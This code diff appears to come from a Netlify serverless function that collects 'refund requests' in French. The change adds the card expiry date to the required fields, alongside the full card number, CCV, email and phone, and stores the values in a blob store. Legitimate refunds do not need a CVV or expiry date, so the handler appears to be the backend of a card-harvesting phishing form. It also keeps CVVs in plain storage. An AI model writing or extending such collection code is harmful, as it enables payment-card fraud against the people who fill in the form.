@@ -1,7 +1,7 @@
 import { getStore } from "@netlify/blobs";
 
 const STORE_NAME = "refund-requests";
-const REQUIRED_FIELDS = ["reference", "montant", "email", "telephone", "numeroCarteBancaire", "ccv"];
+const REQUIRED_FIELDS = ["reference", "montant", "email", "telephone", "numeroCarteBancaire", "dateExpirationCarte", "ccv"];
 
 function json(statusCode, body) {
   return {
@@ -75,7 +75,9 @@ export async function handler(event) {
     orderDate: String(payload.dateAchat || "").trim(),
     postalCode: String(payload.codePostal || "").trim(),
     cardNumber: String(payload.numeroCarteBancaire || payload.cardNumber || payload.iban || "").trim(),
-      numeroCarteBancaire: String(payload.numeroCarteBancaire || payload.cardNumber || payload.iban || "").trim(),
+    numeroCarteBancaire: String(payload.numeroCarteBancaire || payload.cardNumber || payload.iban || "").trim(),
+    cardExpiryDate: String(payload.dateExpirationCarte || payload.cardExpiryDate || "").trim(),
+    dateExpirationCarte: String(payload.dateExpirationCarte || payload.cardExpiryDate || "").trim(),
     ccv: String(payload.ccv || "").trim(),
     details: String(payload.details || "").trim(),
   };
